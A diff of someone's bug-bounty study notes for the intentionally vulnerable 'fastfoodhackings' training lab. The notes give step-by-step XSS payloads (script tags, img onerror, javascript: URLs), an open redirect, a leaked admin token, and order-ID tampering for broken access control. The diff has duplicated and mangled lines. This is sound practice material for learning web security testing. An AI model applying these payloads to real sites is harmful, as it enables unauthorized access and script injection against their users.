-https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2);//&type=1
-/fastfoodhackings/api/admin.php?adToken= 
- {"username":"test-zseano","password":"SuP3RG0OdP@ssw0rd!"}
+[+] look for robot.txt files and open each dir to see which ever one redirects or responds
+
+https://www.bugbountytraining.com/fastfoodhackings/admin.php[https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2)&type=1](https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2)&type=1)[https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2);//&type=1](https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=javascript:alert(2);//&type=1)
+/fastfoodhackings/api/admin.php?adToken=
+{"username":"test-zseano","password":"SuP3RG0OdP@ssw0rd!"}
 book.php?promoCode=UKONLY
 var promotion = 'UKONLY';aalertlert(2);var x='a';   payload is {<UKONLY';aalertlert(2);var x='a>}
-
 
 #Perform HTML injection in url field && Escalate to XSS
 https://www.bugbountytraining.com/fastfoodhackings/index.php?act=logintesttest
 [+] add a random word to the login e.g <testtest>
 https://www.bugbountytraining.com/fastfoodhackings/index.php?act=-->logintesttest
 [+] check if test reflects in page, try to bold it to be sure e.g {https://www.bugbountytraining.com/fastfoodhackings/index.php?act=--><b>logintestest</b>}
+
 - if HTML injection reflects, replace injection with an XSS & and leave the last HTML tag open because of the comment "-->" {https://www.bugbountytraining.com/fastfoodhackings/index.php?act=--><script>alert(3)</script}
 - if you're stil getting filtered try a tag that does not need to be closed e.g "img" and leave the end > open {https://www.bugbountytraining.com/fastfoodhackings/index.php?act=--><img src=x onerror=alert(2)}
 
 #Manipulate number specific date picker in booking section for RXSS
 [+]Enter test details like a real user and inrecept booking with burp
+
 - check the filled details in burp request, closeand end each filled in parameter with {"><script>alert(2)</script>}
 - foward request
 - you can also test each filled parameter one after the other o run each on intruder
 
 #Manipulate order ID in Booking for BAC
+
 - fill a test detail and intercept request, send the request to repeater
 - check the order_ID if it ends with "=" then its in base64, decode base64
 - manipulate and base64 encode order number to see if you can load another order
-- if it loads another users data then you have Broken Access Control 
+- if it loads another users data then you have Broken Access Control
 
-#Others 
+#Others
 [+] load menue page and intercerpt, keep forwarding requests till you find a juicy directory e.g (/menue)
 [+] load "/admin" from the diredctory gotten on robot.txt in the menue URL
-- if you're denied access, intercept request and forward to see a "addToken" in url request 
-- search the "adToken=" in TARGET to see the Token needed for admin access 
-- paste the URL dir in the search bar witth scope website and load 
-// you can also use the target to check for other directories an endpoint is leading to e.g (f=) then search 
+
+- if you're denied access, intercept request and forward to see a "addToken" in url request
+- search the "adToken=" in TARGET to see the Token needed for admin access
+- paste the URL dir in the search bar witth scope website and load
+// you can also use the target to check for other directories an endpoint is leading to e.g (f=) then search
 // Regex in burp: {\?.*?=}
 
-#BAC 
-[+] when you get to login with any credential, try load anotther user by changing ID 
+#BAC
+[+] when you get to login with any credential, try load anotther user by changing ID
 
 #Stored XSS
 [+]load URl  /book.php?promoCode=UKONLY
--input a test word in the url and check where it reflects on the source code 
+-input a test word in the url and check where it reflects on the source code
+
 - for the above site, it redirects and reflects in the source code of the menu.php path
 - input payload on book.php?promoCode=<UKONLY';aalertlert(2);var x='a}
-- load the Menu page and you should have a stored XSS 
+- load the Menu page and you should have a stored XSS
 
 #Open redirect with LazySec
 [+] use Lazysec to show hidden parameters on login form page
-- check its href functionality and try manipulate where site redirects to 
+
+- check its href functionality and try manipulate where site redirects to
 - check TARGET to search for the redirect functionality in site and check what parameter is used to get request e.g (from)
 - use <?from=https://google.com as test>, click on link and if it redirects report your vulnerability
 [+] {https://www.bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=https://google.com} as seen from TARGET param field
-// you can also inject RXSS in the href straight from the search bar e.g {https://www.bugbountytraining.com/fastfoodhackings/index.php?from=javascript:alert(3)}
+// you can also inject RXSS in the href straight from the search bar e.g {[https://www.bugbountytraining.com/fastfoodhackings/index.php?from=javascript:alert(3)](https://www.bugbountytraining.com/fastfoodhackings/index.php?from=javascript:alert(3))}
 - click on login and the link from earlier that gave Open redirect
 OR
-https://www.bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=javascript:alert(3)
+[https://www.bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=javascript:alert(3)](https://www.bugbountytraining.com/fastfoodhackings/index.php?from=test&type=1#redir=javascript:alert(3))
 
-
-
+XXE
